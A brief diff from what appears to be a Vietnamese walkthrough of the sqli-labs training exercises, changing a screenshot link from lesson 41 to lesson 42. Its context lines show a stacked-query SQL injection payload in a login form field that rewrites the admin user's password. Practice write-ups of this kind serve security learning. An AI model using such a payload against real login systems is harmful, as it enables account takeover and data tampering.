@@ -74,5 +74,5 @@ Sau khi chèn câu query.
 
 Payload: `login_user=admin&login_password=1';UPDATE+users+SET+password='i-hacked-u-again'+WHERE+username+='admin'--+&mysubmit=Login`
 
-![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-41.png?raw=true)
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-42.png?raw=true)
 
